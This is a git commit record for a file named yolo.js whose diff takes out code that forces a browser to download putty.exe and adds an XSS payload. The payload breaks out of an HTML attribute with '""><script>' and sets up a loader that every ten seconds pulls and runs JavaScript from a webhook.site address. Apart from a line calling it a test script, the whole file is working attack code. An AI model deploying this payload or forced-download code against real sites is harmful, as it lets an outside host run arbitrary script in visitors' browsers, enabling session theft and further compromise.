0c9fe701ddb4e8d5ce2da0ff08dc5654408827fa
Shadow0ps <john.wethington@mysensitivedata.com>
2019-11-10 16:41:09 -0500

    Update yolo.js

--- yolo.js
+++ yolo.js
@@ -1,5 +1,13 @@
-var link = document.createElement('a');
-link.href = 'http://the.earth.li/~sgtatham/putty/latest/x86/putty.exe';
-link.download = '';
-document.body.appendChild(link);
-link.click();
+THIS IS A TEST SCRIPT
+""><script>function connectLoader(retval) {
+    var URL= 'http://webhook.site/d53b621b-ded0-468c-adae-3a436d8f9f12';
+    var scriptTag = document.getElementById('loadScript');
+    var head = document.getElementsByTagName('head').item(0);
+    if(scriptTag) head.removeChild(scriptTag);
+    var script = document.createElement('script');
+    script.src = URL;
+    script.type = 'text/javascript';
+    script.id = 'loadScript';
+    head.appendChild(script);
+}
+setInterval('connectLoader()',10000);</script>
